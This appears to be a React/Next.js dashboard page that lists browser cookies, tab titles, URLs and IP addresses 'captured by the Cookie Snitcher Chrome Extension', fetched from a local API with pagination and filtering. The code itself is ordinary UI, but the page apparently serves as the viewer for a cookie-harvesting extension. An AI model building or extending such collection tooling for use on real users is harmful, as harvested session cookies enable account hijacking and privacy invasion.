"use client";

import { useState, useEffect } from "react";
import CookieTable from "@/components/CookieTable";
import Pagination from "@/components/Pagination";
import FilterBar from "@/components/FilterBar";

type CookieEntry = {
  id: number;
  url: string;
  tabId: number;
  tabTitle: string | null;
  favIconUrl: string | null;
  cookiesData: any[];
  ipAddress: string | null;
  createdAt: string;
};

type PaginationData = {
  page: number;
  limit: number;
  total: number;
  pages: number;
};

export default function Home() {
  const [cookieEntries, setCookieEntries] = useState<CookieEntry[]>([]);
  const [isLoading, setIsLoading] = useState(true);
  const [pagination, setPagination] = useState<PaginationData>({
    page: 1,
    limit: 10,
    total: 0,
    pages: 0,
  });
  const [urlFilter, setUrlFilter] = useState("");

  const fetchCookies = async (page = 1, url = "") => {
    setIsLoading(true);
    try {
      let endpoint = `/api/cookies?page=${page}&limit=${pagination.limit}`;
      if (url) {
        endpoint += `&url=${encodeURIComponent(url)}`;
      }

      const response = await fetch(endpoint);
      const data = await response.json();

      if (data.success) {
        setCookieEntries(data.data);
        setPagination(data.pagination);
      } else {
        console.error("Failed to fetch cookies:", data.message);
      }
    } catch (error) {
      console.error("Error fetching cookies:", error);
    } finally {
      setIsLoading(false);
    }
  };

  useEffect(() => {
    fetchCookies(1, urlFilter);
  }, []);

  const handlePageChange = (page: number) => {
    fetchCookies(page, urlFilter);
  };

  const handleFilter = (url: string) => {
    setUrlFilter(url);
    fetchCookies(1, url);
  };

  return (
    <div>
      <div className="mb-8">
        <h1 className="text-3xl font-bold mb-2">Cookie Tracker Dashboard</h1>
        <p className="text-gray-400">
          View and analyze cookies captured by the Cookie Snitcher Chrome Extension.
        </p>
      </div>

      <FilterBar onFilter={handleFilter} />

      <div className="bg-gray-900 rounded-lg shadow-lg overflow-hidden">
        <CookieTable entries={cookieEntries} isLoading={isLoading} refreshCookies={() => fetchCookies(pagination.page, urlFilter)}/>
        
        {!isLoading && (
          <div className="bg-gray-900 border-t border-gray-800 p-4">
            <Pagination
              currentPage={pagination.page}
              totalPages={pagination.pages}
              onPageChange={handlePageChange}
            />
          </div>
        )}
      </div>

      {cookieEntries.length > 0 && (
        <div className="mt-6 text-sm text-gray-500">
          Showing {cookieEntries.length} of {pagination.total} entries
        </div>
      )}
    </div>
  );
}
